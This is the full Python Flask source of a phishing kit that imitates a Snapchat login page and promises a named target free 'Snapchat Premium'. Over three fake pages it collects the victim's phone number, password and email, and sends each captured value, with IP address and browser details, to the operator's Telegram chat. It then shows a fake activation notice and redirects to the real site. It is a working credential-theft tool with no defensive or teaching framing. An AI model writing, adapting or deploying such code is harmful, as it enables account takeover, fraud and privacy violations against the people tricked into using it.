import os
import time
import logging
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, session, redirect, url_for, send_from_directory
from dotenv import load_dotenv

# ==================== CONFIGURATION ====================
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('FLASK_SECRET_KEY', 'fallback_secret_key_change_in_production')

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
VICTIM_NAME = os.getenv('VICTIM_NAME', 'User')
ACTIVATION_HOURS = int(os.getenv('ACTIVATION_HOURS', '12'))

# Configure Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== TELEGRAM UTILITIES ====================
def send_telegram_message(message):
    """Sends a direct alert to Telegram using requests."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.error("Telegram credentials missing. Check .env file.")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        r.raise_for_status()
        logger.info("Telegram alert sent successfully.")
        return True
    except Exception as e:
        logger.error(f"Telegram send failed: {e}")
        return False

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def log_visit(event_type, details=None):
    ip = get_client_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    
    msg = f"<b>Snapchat Verify - {event_type}</b>\n"
    msg += f"<b>Target:</b> {VICTIM_NAME}\n"
    msg += f"<b>IP:</b> {ip}\n"
    msg += f"<b>UA:</b> {ua[:80]}\n"
    if details:
        msg += f"<b>Data:</b> <code>{details}</code>\n"
    
    send_telegram_message(msg)

# ==================== HTML TEMPLATES ====================
INDEX_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <title>Snapchat - Log In</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; border-radius: 20px; box-shadow: 0 10px 30px rgba(255, 215, 0, 0.05); padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .premium-text { background: linear-gradient(90deg, #FFFC00, #F5B041); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 15px 0; font-size: 16px; }
        .victim-name { color: #FFFC00; font-weight: bold; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
        .phone-input { display: flex; gap: 10px; }
        .country-code { width: 100px; padding: 12px; border: 1px solid #333; border-radius: 8px; background: #111; color: #fff; font-size: 14px; outline: none; }
        input[type="tel"] { flex: 1; padding: 12px; border: 1px solid #333; border-radius: 8px; background: #111; color: #fff; font-size: 16px; outline: none; }
        input:focus, select:focus { border-color: #FFFC00; }
        .hint { color: #777; font-size: 12px; margin-top: 5px; display: block; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-login:hover { transform: translateY(-2px); opacity: 0.9; }
        .footer-links { display: flex; justify-content: center; gap: 20px; margin: 25px 0; }
        .footer-links a { color: #FFFC00; text-decoration: none; font-size: 14px; }
        .footer { color: #666; font-size: 12px; margin-top: 20px; }
        .footer a { color: #999; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" alt="Snapchat Premium">
        </div>
        <h2>Log In to Snapchat</h2>
        <p class="premium-text">Congratulations <span class="victim-name">{{ victim_name }}</span>! You've been selected for Snapchat Premium.</p>
        <p class="info-text">Verify your account to activate exclusive Premium features for 12 months absolutely free.</p>
        
        <form action="/login" method="POST" class="login-form">
            <div class="input-group">
                <label for="phone">Mobile Number</label>
                <div class="phone-input">
                    <select name="countryCode" id="countryCode" class="country-code">
                        <option value="+91" selected>+91 India</option>
                        <option value="+1">+1 USA</option>
                    </select>
                    <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit number" required pattern="[0-9]{10}" maxlength="10">
                </div>
                <small class="hint">Enter your mobile number without +91</small>
            </div>
            <button type="submit" class="btn-login">Log In</button>
        </form>
    </div>
    <script>
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
    </script>
</body>
</html>
'''

PASSWORD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <title>Snapchat - Enter Password</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; border-radius: 20px; padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-size: 14px; }
        input[type="password"], input[type="text"] { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #111; color: #fff; outline: none; }
        input:focus { border-color: #FFFC00; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-login:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" alt="Snapchat Premium">
        </div>
        <h2>Enter Password</h2>
        <p class="info-text">For security, please enter your Snapchat password to continue.</p>
        <form action="/submit_password" method="POST" class="login-form">
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required minlength="6">
            </div>
            <button type="submit" class="btn-login">Continue</button>
        </form>
    </div>
</body>
</html>
'''

EMAIL_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <title>Snapchat - Verify Email</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; border-radius: 20px; padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-size: 14px; }
        input[type="email"] { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #111; color: #fff; outline: none; }
        input:focus { border-color: #FFFC00; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" alt="Snapchat Premium">
        </div>
        <h2>Almost There!</h2>
        <p class="info-text">Final step: Enter your email address for Premium activation confirmation.</p>
        <form action="/submit_email" method="POST" class="login-form">
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="you@example.com" required>
            </div>
            <button type="submit" class="btn-login">Finish & Activate Premium</button>
        </form>
    </div>
</body>
</html>
'''

SUCCESS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <title>Snapchat Premium Activated</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 100px; height: 100px; border-radius: 20px; object-fit: cover; }
        h1 { color: #ffffff; margin-bottom: 10px; font-size: 32px; }
        h3 { color: #dddddd; margin-bottom: 20px; font-size: 20px; }
        .success-icon { width: 80px; height: 80px; background: linear-gradient(135deg, #FFFC00, #F5B041); color: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 20px auto; font-weight: bold; }
        .success-text { color: #aaaaaa; margin-bottom: 25px; font-size: 16px; }
        .activation-time { color: #FFFC00; font-weight: bold; font-size: 20px; margin: 10px 0; }
        .btn-back { display: inline-block; background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; padding: 12px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" alt="Snapchat Premium">
        </div>
        <h1>Success!</h1>
        <div class="success-icon">✓</div>
        <h3>Snapchat Premium Activated</h3>
        <p class="success-text">Your Snapchat Premium access is being processed and will be fully activated within</p>
        <div class="activation-time">{{ activation_hours }} hours</div>
        <a href="https://snapchat.com" class="btn-back">Return to Snapchat</a>
    </div>
</body>
</html>
'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    if 'phone' in session:
        return redirect(url_for('password_page'))
    log_visit("Page View")
    return render_template_string(INDEX_HTML, victim_name=VICTIM_NAME)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone', '').strip()
    if not phone.isdigit() or len(phone) != 10:
        return redirect(url_for('index'))
    
    session['phone'] = phone
    log_visit("Phone Captured", f"+91 {phone}")
    return redirect(url_for('password_page'))

@app.route('/password')
def password_page():
    if 'phone' not in session:
        return redirect(url_for('index'))
    return render_template_string(PASSWORD_HTML)

@app.route('/submit_password', methods=['POST'])
def submit_password():
    if 'phone' not in session:
        return redirect(url_for('index'))
    
    password = request.form.get('password', '').strip()
    if not password or len(password) < 6:
        return redirect(url_for('password_page'))
    
    session['password'] = password
    log_visit("Password Captured", f"Phone: {session['phone']} | Pass: {password}")
    return redirect(url_for('email_page'))

@app.route('/email')
def email_page():
    if 'password' not in session:
        return redirect(url_for('index'))
    return render_template_string(EMAIL_HTML)

@app.route('/submit_email', methods=['POST'])
def submit_email():
    if 'password' not in session:
        return redirect(url_for('index'))
    
    email = request.form.get('email', '').strip()
    if not email or '@' not in email:
        return redirect(url_for('email_page'))
    
    data = f"Phone: {session.get('phone')} | Pass: {session.get('password')} | Email: {email}"
    log_visit("Full Details Captured", data)
    
    session.clear()
    return render_template_string(SUCCESS_HTML, activation_hours=ACTIVATION_HOURS)

@app.route('/favicon.ico')
def favicon():
    return '', 204

# ==================== START ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)